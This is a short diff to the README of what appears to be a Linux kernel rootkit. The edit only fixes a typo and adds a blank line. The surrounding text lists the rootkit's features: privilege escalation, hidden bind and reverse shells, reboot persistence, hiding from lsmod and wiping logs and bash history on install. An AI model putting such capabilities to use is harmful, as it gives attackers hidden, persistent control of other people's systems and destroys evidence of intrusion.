@@ -16,7 +16,7 @@ Features :
 - privilege escalation using kill 000 command
 - hide bind shell and reverse shell port from netstat
 - hide bind shell and reverse shell process
-- rootkit persistence to survice after reboot
+- rootkit persistence to survive after reboot
 - hide from lsmod
 - clean logs and bash history during installation
 
@@ -29,6 +29,7 @@ In case you have installed linux kernel headers, make and gcc, install it by run
 In case you have not installed linux kernel headers, make and gcc, install it by running the installer script :
 
 ./install.sh
+
 
 =====USING THE ROOTKIT=====
 
